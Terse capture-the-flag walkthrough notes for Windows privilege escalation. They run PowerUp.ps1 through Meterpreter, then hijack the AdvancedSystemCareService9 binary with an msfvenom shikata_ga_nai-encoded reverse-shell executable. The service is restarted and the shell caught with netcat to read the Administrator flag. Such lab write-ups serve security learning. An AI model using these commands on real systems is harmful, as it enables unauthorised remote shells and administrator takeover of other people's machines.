1) 
- git clone https://github.com/PowerShellMafia/PowerSploit.git
- upload /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
- load powershell
- powershell_shell
- . .\PowerUp.ps1
- Invoke-AllChecks
2) AdvancedSystemCareService9
3)
-  msfvenom -p windows/shell_reverse_tcp LHOST=10.11.13.209 LPORT=1234 -e x86/shikata_ga_nai -f exe -o ASCService.exe
- cd /Program\ Files\ (x86)\IObit\
- upload ASCService.exe
- copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
- shell
- sc stop  AdvancedSystemCareService9 
- sc start  AdvancedSystemCareService9 
- in a new tab, nc -lvnp 1234
- type /Users/Administrator/Desktop/root.txt